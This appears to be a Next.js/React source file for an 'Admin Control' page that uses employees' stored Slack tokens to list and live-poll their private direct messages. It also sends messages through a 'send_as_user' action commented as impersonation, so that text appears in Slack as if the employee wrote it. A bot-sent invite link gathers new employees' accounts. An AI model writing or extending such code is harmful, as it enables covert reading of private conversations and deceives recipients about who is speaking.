/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable react-hooks/immutability */
// app/dm-manager/page.tsx
"use client";
import React, { useEffect, useState } from 'react';
import { db } from '@/lib/firebase';
import { collection, onSnapshot } from 'firebase/firestore';
import { Send, User, MessageSquare, Shield, Link as LinkIcon, Lock } from 'lucide-react';

export default function DMManager() {
  // State
  const [connectedUsers, setConnectedUsers] = useState<any[]>([]);
  const [activeUser, setActiveUser] = useState<any>(null); // Whose account are we controlling?
  const [chats, setChats] = useState<any[]>([]);
  const [activeChat, setActiveChat] = useState<any>(null); // Which conversation is open?
  const [messages, setMessages] = useState<any[]>([]);
  const [inputText, setInputText] = useState('');
  
  // Invite System State
  const [inviteId, setInviteId] = useState('');
  const [inviteStatus, setInviteStatus] = useState('');

  // 1. Load Connected Employees from Firebase
  useEffect(() => {
    const unsub = onSnapshot(collection(db, "slack_tokens"), (snap) => {
      setConnectedUsers(snap.docs.map(d => ({ id: d.id, ...d.data() })));
    });
    return () => unsub();
  }, []);

  // 2. Load Chats when Admin selects an Employee
  useEffect(() => {
    if (!activeUser) return;
    fetch('/api/slack/manager', {
        method: 'POST',
        body: JSON.stringify({ action: 'list_chats', targetUserId: activeUser.id })
    })
    .then(r => r.json())
    .then(d => setChats(d.chats || []));
  }, [activeUser]);

  // 3. Load Messages when Admin selects a Chat
  useEffect(() => {
    if (!activeChat) return;
    loadMessages();
    const interval = setInterval(loadMessages, 3000); // Live refresh every 3s
    return () => clearInterval(interval);
  }, [activeChat]);

  const loadMessages = async () => {
    if(!activeUser || !activeChat) return;
    const res = await fetch('/api/slack/manager', {
        method: 'POST',
        body: JSON.stringify({ 
            action: 'get_messages', 
            targetUserId: activeUser.id, 
            channelId: activeChat.id 
        })
    });
    const data = await res.json();
    if(data.messages) setMessages(data.messages);
  };

  // 4. Send Message (Impersonation)
  const sendMessage = async (e: React.FormEvent) => {
    e.preventDefault();
    if(!inputText.trim()) return;

    await fetch('/api/slack/manager', {
        method: 'POST',
        body: JSON.stringify({ 
            action: 'send_as_user', 
            targetUserId: activeUser.id, 
            channelId: activeChat.id,
            text: inputText
        })
    });
    setInputText('');
    loadMessages();
  };

  // 5. Send Invite Link via Bot
  const sendInvite = async () => {
    if(!inviteId) return;
    setInviteStatus('Sending...');
    const res = await fetch('/api/slack/manager', {
        method: 'POST',
        body: JSON.stringify({ action: 'send_invite', targetUserId: inviteId })
    });
    const data = await res.json();
    if(data.success) {
        setInviteStatus('✅ Link sent to DM!');
        setInviteId('');
    } else {
        setInviteStatus('❌ Failed. Check User ID.');
    }
    setTimeout(() => setInviteStatus(''), 3000);
  };

  return (
    <div className="flex h-screen bg-black text-white font-sans overflow-hidden">
        
        {/* LEFT: Sidebar (Employees & Invite) */}
        <div className="w-72 bg-gray-900 border-r border-gray-800 flex flex-col">
            <div className="p-4 border-b border-gray-800">
                <h2 className="font-bold text-amber-500 flex items-center gap-2">
                    <Shield className="h-5 w-5" /> Admin Control
                </h2>
            </div>
            
            {/* Invite Section */}
            <div className="p-4 bg-gray-800/50 m-2 rounded-xl">
                <label className="text-xs text-gray-400 mb-1 block">Connect New Employee</label>
                <div className="flex gap-2">
                    <input 
                        className="bg-gray-900 border border-gray-700 rounded p-2 text-xs w-full"
                        placeholder="Enter Slack User ID (U123..)"
                        value={inviteId}
                        onChange={e => setInviteId(e.target.value)}
                    />
                    <button onClick={sendInvite} className="bg-blue-600 p-2 rounded hover:bg-blue-500">
                        <LinkIcon className="h-4 w-4" />
                    </button>
                </div>
                {inviteStatus && <p className="text-xs mt-1 text-green-400">{inviteStatus}</p>}
            </div>

            {/* List Connected Users */}
            <div className="flex-1 overflow-y-auto p-2">
                <p className="text-xs text-gray-500 px-2 mb-2">CONNECTED ACCOUNTS</p>
                {connectedUsers.map(u => (
                    <button 
                        key={u.id}
                        onClick={() => { setActiveUser(u); setActiveChat(null); }}
                        className={`w-full flex items-center gap-3 p-3 rounded-lg text-left transition-all ${activeUser?.id === u.id ? 'bg-amber-500/20 text-white border border-amber-500/50' : 'text-gray-400 hover:bg-gray-800'}`}
                    >
                        <img src={u.image} className="w-8 h-8 rounded-full bg-gray-700" />
                        <div>
                            <div className="font-medium text-sm">{u.name}</div>
                            <div className="text-[10px] opacity-60">{u.id}</div>
                        </div>
                    </button>
                ))}
            </div>
        </div>

        {/* MIDDLE: Chat List */}
        <div className="w-80 bg-gray-900/50 border-r border-gray-800 flex flex-col">
            <div className="p-4 border-b border-gray-800 h-16 flex items-center">
                <h3 className="font-semibold">{activeUser ? `${activeUser.name}'s DMs` : 'Select Employee'}</h3>
            </div>
            <div className="flex-1 overflow-y-auto">
                {chats.map(chat => (
                    <button 
                        key={chat.id}
                        onClick={() => setActiveChat(chat)}
                        className={`w-full p-4 border-b border-gray-800/50 flex items-center gap-3 hover:bg-gray-800/50 ${activeChat?.id === chat.id ? 'bg-blue-500/10 border-l-2 border-l-blue-500' : ''}`}
                    >
                        {chat.image ? <img src={chat.image} className="w-8 h-8 rounded" /> : <User className="w-8 h-8 p-1 bg-gray-700 rounded" />}
                        <div className="text-left overflow-hidden">
                            <div className="text-sm font-medium text-gray-200 truncate">{chat.name}</div>
                            <div className="text-xs text-gray-500">Last msg...</div>
                        </div>
                    </button>
                ))}
            </div>
        </div>

        {/* RIGHT: Active Chat */}
        <div className="flex-1 flex flex-col bg-gray-950">
            {activeChat ? (
                <>
                    {/* Header */}
                    <div className="h-16 border-b border-gray-800 flex items-center justify-between px-6 bg-gray-900/80">
                        <div className="flex items-center gap-3">
                            <div className="font-bold text-lg">{activeChat.name}</div>
                            <span className="text-xs bg-red-500/20 text-red-400 px-2 py-0.5 rounded border border-red-500/30 flex items-center gap-1">
                                <Lock className="h-3 w-3" /> Live Access as {activeUser.name}
                            </span>
                        </div>
                    </div>

                    {/* Messages */}
                    <div className="flex-1 overflow-y-auto p-6 space-y-4 flex flex-col-reverse">
                        {/* Flex-col-reverse keeps scroll at bottom */}
                        <div className="space-y-4"> 
                            {messages.map((m, i) => {
                                const isMe = m.user === activeUser.id; // Check if message is from the employee
                                return (
                                    <div key={i} className={`flex ${isMe ? 'justify-end' : 'justify-start'}`}>
                                        <div className={`max-w-[70%] p-3 rounded-2xl text-sm ${isMe ? 'bg-blue-600 text-white rounded-tr-none' : 'bg-gray-800 text-gray-300 rounded-tl-none'}`}>
                                            {m.text}
                                        </div>
                                    </div>
                                )
                            })}
                        </div>
                    </div>

                    {/* Input */}
                    <form onSubmit={sendMessage} className="p-4 bg-gray-900 border-t border-gray-800">
                        <div className="relative flex items-center gap-2">
                            <input 
                                value={inputText}
                                onChange={e => setInputText(e.target.value)}
                                className="flex-1 bg-gray-800 border-none rounded-xl px-4 py-3 text-white focus:ring-2 focus:ring-blue-500 outline-none"
                                placeholder={`Message as ${activeUser.name}...`}
                            />
                            <button type="submit" className="bg-blue-600 hover:bg-blue-500 p-3 rounded-xl transition-colors">
                                <Send className="h-5 w-5" />
                            </button>
                        </div>
                        <p className="text-[10px] text-gray-500 mt-2 text-center">
                            Messages sent here will appear in Slack as if {activeUser.name} sent them.
                        </p>
                    </form>
                </>
            ) : (
                <div className="flex-1 flex items-center justify-center text-gray-600 flex-col">
                    <MessageSquare className="h-16 w-16 mb-4 opacity-20" />
                    <p>Select a conversation to start monitoring</p>
                </div>
            )}
        </div>
    </div>
  );
}